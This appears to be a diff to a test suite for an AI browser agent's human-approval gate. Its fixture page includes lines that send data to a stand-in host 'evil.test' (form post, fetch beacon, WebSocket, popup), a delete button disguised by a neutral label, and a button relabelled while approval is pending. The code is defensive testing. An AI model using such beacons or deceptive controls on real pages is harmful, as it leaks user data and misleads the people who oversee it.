@@ -36,14 +36,20 @@ const PAGES = {
     <form action="/browser-lab/submit" method="post"><input name="r" aria-label="Route"><button type="submit" id="fa" formaction="/browser-lab/page2.html">Route form</button></form>
     <form action="https://evil.test/collect" method="post"><input name="x" aria-label="External field"><button type="submit">Send external</button></form>
     <form action="/other/secret.html" method="post"><button type="submit">Send elsewhere</button></form>
+    <div role="switch" tabindex="0" aria-checked="false" onclick="echo.textContent='switched'">Dark mode</div>
+    <button type="button" aria-controls="panel" onclick="echo.textContent='saved-by-aria-button'">Save changes</button>
+    <button type="button" onclick="echo.textContent='shared'">Share my profile publicly with all 500 contacts</button>
+    <label><input type="checkbox" id="auto" onchange="echo.textContent='autosaved'"> Autosave</label>
+    <a href="/browser-lab/page2.html?q=${"A".repeat(400)}">Long query link</a>
+    <button type="button" aria-label="Neutral"><img alt="Delete account" width="1" height="1" src="data:image/gif;base64,R0lGODlhAQABAAAAACw="></button>
     <button type="button">Pay now</button>
     <button type="button" id="dlg" onclick="alert('hi');document.getElementById('echo').textContent+=' dialog-done'">Show dialog</button>
     <button type="button" id="leave" onclick="location.href='https://evil.test/js-nav'">Go away</button>
     <button type="button" id="beacon" onclick="fetch('https://evil.test/beacon',{mode:'no-cors'});new WebSocket('wss://evil.test/ws');window.open('https://evil.test/pop')">Ping</button>
     <button type="button" id="ls" onclick="localStorage.setItem('k','v1');document.cookie='c=1;path=/';echo.textContent='stored'">Store state</button>
     <button type="button" id="show" onclick="echo.textContent='ls='+localStorage.getItem('k')+' ck='+document.cookie">Show state</button>
-    <button type="button" id="grow">Save</button>
-    <script>setInterval(async()=>{try{if((await (await fetch('/browser-lab/flip')).text())==='1')document.getElementById('grow').textContent='Save everything'}catch(e){}},100)</script>
+    <button type="button" id="grow">Commit</button>
+    <script>setInterval(async()=>{try{if((await (await fetch('/browser-lab/flip')).text())==='1')document.getElementById('grow').textContent='Commit everything'}catch(e){}},100)</script>
     <button type="button">Twin</button><button type="button">Twin</button>
     <button type="button" disabled>Disabled one</button><button type="button" style="display:none">Hidden one</button>
     <p id="echo"></p>`),
@@ -240,6 +246,38 @@ test("interactive session against real Chromium", { skip: !haveChromium && "Chro
     await stopAndCheck(v.id);
   });
 
+  await t.test("review F2/F3: scripted toggles need approval, and the approval shows the RESOLVED element, not the typed substring", async () => {
+    const v = await start();
+    for (const [target, label] of [[role("switch", "Dark mode"), "role=switch div"], [role("button", "Save changes"), "aria-controls button"], [{ by: "label", value: "Autosave" }, "checkbox with onchange"]]) {
+      const n = (await get(v.id)).actions.length;
+      assert.equal((await act(v.id, { tool: "click", target })).status, 202, label);
+      const w = await until(v.id, (x) => x.pending && x.pending.seq === n + 1, "pending " + label);
+      assert.ok(["button", "submit"].includes(w.pending.kind), label);
+      assert.match(await (async () => echo(await get(v.id)))(), /^((?!switched|saved-by-aria-button|autosaved).)*$/s, label + ": nothing happened before approval");
+      await api("POST", `/v1/jobs/${v.id}/actions/${w.pending.seq}/reject`);
+      await until(v.id, (x) => !x.pending && settled(x), "rejected " + label);
+    }
+    const n = (await get(v.id)).actions.length;
+    await act(v.id, { tool: "click", target: role("button", "Share my") });   // a short substring of a long label
+    const w = await until(v.id, (x) => x.pending && x.pending.seq === n + 1, "pending share");
+    assert.equal(w.pending.element.tag, "button");
+    assert.match(w.pending.element.text, /^Share my profile publicly with all 500 contacts/);
+    await api("POST", `/v1/jobs/${v.id}/actions/${w.pending.seq}/reject`);
+    await until(v.id, (x) => !x.pending && settled(x), "rejected share");
+    // the accessible-name sources the page uses (img alt inside a button) count as the element's name
+    const r = await run(v.id, { tool: "click", target: role("button", "Neutral") });
+    assert.deepEqual([lastAction(r).status, lastAction(r).error], ["denied", "sensitive_action"]);
+    await stopAndCheck(v.id);
+  });
+
+  await t.test("review F6: a long query on the current page never reaches the view (origin + path only)", async () => {
+    const v = await start();
+    const r = await run(v.id, { tool: "click", target: role("link", "Long query link") });
+    assert.equal(lastAction(r).status, "done");
+    assert.match(r.result.url, /^https:\/\/lab\.test\/browser-lab\/page2\.html$/);
+    await stopAndCheck(v.id);
+  });
+
   await t.test("the approval shows the submitter's own formaction, not the form's action", async () => {
     const v = await start();
     await act(v.id, { tool: "click", target: role("button", "Route form") });
@@ -252,7 +290,7 @@ test("interactive session against real Chromium", { skip: !haveChromium && "Chro
 
   await t.test("approval is bound to the element: if the page changes while waiting, the step is refused", async () => {
     const v = await start();
-    await act(v.id, { tool: "click", target: role("button", "Save") });
+    await act(v.id, { tool: "click", target: role("button", "Commit") });
     const w = await until(v.id, (x) => x.pending, "pending save");
     flip = true; await tick(500); // the page rewrites the very button the user is looking at (a bait-and-switch)
     await api("POST", `/v1/jobs/${v.id}/actions/${w.pending.seq}/approve`);
